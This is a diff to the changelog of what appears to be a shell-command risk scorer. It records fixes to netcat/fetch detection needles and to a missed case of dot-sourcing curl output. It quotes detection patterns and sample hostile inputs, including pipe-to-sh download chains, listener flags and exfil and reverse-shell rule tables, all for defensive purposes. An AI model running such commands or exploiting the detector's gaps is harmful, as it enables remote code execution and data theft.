@@ -4,6 +4,34 @@ All notable changes to HLSE Core (C reference) follow [Keep a Changelog](https:/
 
 ## [Unreleased]
 
+### Fixed (cycle-487)
+- **nc/fetch name-needle cross-fire sweep (real FPs)**: the
+  substring needles `'ncat '`, `'netcat '`, `'fetch '`, `'nc '`,
+  `'nc -l'`, `'nc -p '`, `'ncat --listen'` fired inside container
+  words — `concat x | sh` → P2 40, `mincat x && sh y` → P12b 45,
+  `prefetch x | sh` → P2 40 (prefetch is the NCBI SRA toolkit
+  downloader), `vnc -l` → P13 45 + P8 (real VNC listener), `bnc
+  -l` → P13 45, `sync -l`/`-p` → P13 45, `znc -e conf` → P8 + **P16
+  reverse-shell 60 = 100 BLOCK** (znc is the IRC bouncer), `env |
+  sync x` → 55 exfil arm (`'nc '` ⊂ `'sync '`). Cycle-483's tok fix
+  only covered the P2/P12b fetch gates — the listener, revshell,
+  and exfil tables kept the substring needles. Now: `'fetch '` and
+  the nc-family entries move to `ci_contains_tok`/`hay_any_tok` in
+  all six sites (`'netcat'` gets its own tok — it has no 'nc'
+  adjacency); the P16 `!strstr("sync")` exclusion is subsumed and
+  removed; `PASTE_LISTEN_TOKS` replaces the LISTENERS nc entries
+  (flag-shape `' -lv'` stays plain by design). `znc`/`vnc` keep
+  their deliberate P8 name-mentions; `ncdu`/`ncftp`/`ncurses`
+  exclusions keep guarding the bare-`nc` tok.
+- **P12 dot-source verb completion**: `. <(curl http://x)` and
+  `. $(curl http://x)` scored 0 — `'source '` needs the literal
+  word and `'. /'` needs a slash path, so the POSIX `.` source
+  verb into process/command substitution slipped the gate. Added
+  `ci_contains_tok` `'. <'`/`'. $'` to the eval-verb side (`.`
+  preceded by an alnum — `end. <` — cannot match); `. `file` backtick
+  form stays out (markdown `. \`code\`` prose would FP). Suite
+  24,387 → 24,422 (+35 checks).
+
 ### Fixed (cycle-486)
 - **P12c unpack-then-execute chain**: `tar xzf x.tgz && sh
   x/run.sh`, `unzip x.zip; sh x/s`, `7z x`/`unrar`/`jar xf`/
